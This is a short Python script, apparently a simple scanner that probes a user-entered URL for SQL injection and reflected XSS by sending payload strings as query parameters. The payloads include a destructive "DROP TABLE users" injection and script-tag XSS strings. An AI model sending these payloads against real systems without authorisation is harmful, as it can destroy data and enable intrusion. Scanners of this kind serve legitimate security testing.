import requests


def check_sql_injection(url):

    if not url.endswith('/'):
        url += '/'

    payloads = ["' OR '1'='1", "' OR '1'='1' --", "'; DROP TABLE users; --"]
    for payload in payloads:
        try:

            full_url = url + "?query=" + payload
            response = requests.get(full_url)
            if "error" in response.text.lower() or "SQL" in response.text:
                print(f"[!] Potential SQL Injection vulnerability found at: {full_url}")
                return
        except requests.exceptions.RequestException as e:
            print(f"Request failed: {e}")

    print(f"[+] No SQL Injection vulnerability detected at: {url}")


def check_xss(url):
    if not url.endswith('/'):
        url += '/'

    payloads = ["<script>alert('XSS')</script>", "'><script>alert('XSS')</script>"]
    for payload in payloads:
        try:
            full_url = url + "?input=" + payload  # Example query parameter
            response = requests.get(full_url)
            if payload in response.text:
                print(f"[!] Potential XSS vulnerability found at: {full_url}")
                return
        except requests.exceptions.RequestException as e:
            print(f"Request failed: {e}")

    print(f"[+] No XSS vulnerability detected at: {url}")


if __name__ == "__main__":
    url = input("Enter URL to scan (make sure to include http:// or https://): ")
    check_sql_injection(url)
    check_xss(url)
